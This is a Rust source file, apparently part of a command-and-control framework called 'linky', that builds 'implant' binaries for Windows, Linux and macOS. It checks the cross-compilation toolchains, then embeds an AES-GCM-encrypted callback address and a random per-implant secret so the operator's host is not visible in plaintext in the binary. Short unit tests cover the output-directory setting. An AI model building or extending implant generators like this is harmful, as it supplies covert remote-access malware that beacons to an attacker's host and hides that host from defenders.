use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use std::process::{Command, ExitStatus};

fn output_dir() -> PathBuf {
    std::env::var("LINKY_OUTPUT_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn output_dir_defaults_to_dot() {
        // LINKY_OUTPUT_DIR non défini → doit retourner "."
        std::env::remove_var("LINKY_OUTPUT_DIR");
        assert_eq!(output_dir(), std::path::PathBuf::from("."));
    }

    #[test]
    fn output_dir_uses_env_var() {
        std::env::set_var("LINKY_OUTPUT_DIR", "/tmp/test_implants");
        assert_eq!(output_dir(), std::path::PathBuf::from("/tmp/test_implants"));
        std::env::remove_var("LINKY_OUTPUT_DIR");
    }
}

pub fn generate_windows(callback: &str) {
    build(
        callback,
        "links/windows",
        "x86_64-pc-windows-gnu",
        "link-windows.exe",
    );
}

pub fn generate_linux(callback: &str) {
    build(
        callback,
        "links/linux",
        "x86_64-unknown-linux-musl",
        "link-linux",
    );
}

pub fn generate_osx(callback: &str) {
    build(callback, "links/osx", "x86_64-apple-darwin", "link-osx");
}

// ── Internal ─────────────────────────────────────────────────────────────────

/// Verify that the rustup target is installed and the required C linker is in PATH.
/// Returns `true` if all prerequisites are met, `false` (with diagnostics) otherwise.
fn check_prerequisites(target: &str) -> bool {
    // Check rustup target
    let target_installed = Command::new("rustup")
        .args(["target", "list", "--installed"])
        .output()
        .map(|out| String::from_utf8_lossy(&out.stdout).contains(target))
        .unwrap_or(false);

    if !target_installed {
        tracing::error!("Rust target '{}' is not installed.", target);
        tracing::error!("Fix: rustup target add {}", target);
        if target == "x86_64-apple-darwin" {
            tracing::error!("Note: macOS cross-compilation requires additional setup.");
            tracing::error!("In Podman/podman, you need to:");
            tracing::error!("1. Install the macOS target: rustup target add x86_64-apple-darwin");
            tracing::error!("2. Install cross-compilation tools: apt-get install clang llvm lld");
            tracing::error!("3. Set up macOS SDK and environment variables");
            tracing::error!(
                "4. Configure cross-compilation with: TARGET_CC=x86_64-apple-darwin20-clang"
            );
            tracing::error!("This is complex and may not work in all podman/Podman environments.");
            tracing::error!("Consider building macOS implants on a macOS host instead.");
        }
        return false;
    }

    // Check the C linker/cross-toolchain
    let (linker, debian_pkg, fedora_pkg) = match target {
        "x86_64-pc-windows-gnu" => ("x86_64-w64-mingw32-gcc", "mingw-w64", "mingw64-gcc"),
        "x86_64-unknown-linux-musl" => ("musl-gcc", "musl-tools", "musl-gcc"),
        _ => return true, // No extra toolchain required
    };

    let linker_found = Command::new("which")
        .arg(linker)
        .output()
        .map(|out| out.status.success())
        .unwrap_or(false);

    if !linker_found {
        tracing::error!("Required C toolchain '{}' not found in PATH.", linker);
        tracing::error!("Debian/Ubuntu: sudo apt-get install {}", debian_pkg);
        tracing::error!("Fedora/RHEL:   sudo dnf install {}", fedora_pkg);
        return false;
    }

    true
}

/// Derive a 32-byte key using SHA-256 — must stay aligned with link-common::derive_key.
fn derive_key_sha256(secret: &str, salt: &str) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(secret.as_bytes());
    hasher.update(salt.as_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result[..32]);
    key
}

/// Encrypt `data` with AES-256-GCM and return hex(nonce || ciphertext).
/// Must stay aligned with link-common::encrypt_config.
fn encrypt_aes_gcm(data: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };
    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init failed");
    let ciphertext = cipher
        .encrypt(nonce, data.as_bytes())
        .expect("encryption failed");
    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(&nonce_bytes);
    result.extend_from_slice(&ciphertext);
    hex::encode(result)
}

fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str) {
    let dir = Path::new(crate_dir);
    if !dir.exists() {
        tracing::error!(
            "{} not found. Run linky from the workspace root.",
            crate_dir
        );
        return;
    }

    if !check_prerequisites(target) {
        return;
    }

    // Generate a random 32-byte secret for this implant
    let secret = hex::encode(rand::random::<[u8; 32]>());

    // Encrypt the callback so it is not stored in plaintext in the binary.
    // The implant derives the same key and calls decrypt_config(CALLBACK, &key).
    let key = derive_key_sha256(&secret, "callback-salt");
    let encrypted_callback = encrypt_aes_gcm(callback, &key);

    tracing::info!(
        "Building {} implant ({}) for {} …",
        output_name,
        target,
        callback
    );

    let result = Command::new("cargo")
        .env("CALLBACK", encrypted_callback)
        .env("IMPLANT_SECRET", &secret)
        .args(["build", "--release", "--target", target, "--quiet"])
        .current_dir(dir)
        .status();

    let binary = Path::new("target")
        .join(target)
        .join("release")
        .join(output_name);

    let dest = output_dir().join(output_name);
    handle_result(result, &binary, &dest);
}

fn handle_result(status: io::Result<ExitStatus>, src: &Path, dest: &Path) {
    match status {
        Ok(s) if s.success() => {
            if src.exists() {
                match fs::copy(src, dest) {
                    Ok(_) => tracing::info!("Implant written to {}", dest.display()),
                    Err(e) => tracing::error!("Copy failed: {}", e),
                }
            } else {
                tracing::error!("Build succeeded but binary not found at {}", src.display());
            }
        }
        Ok(s) => tracing::error!("Build failed (exit {})", s),
        Err(e) => tracing::error!("Failed to invoke cargo: {}", e),
    }
}
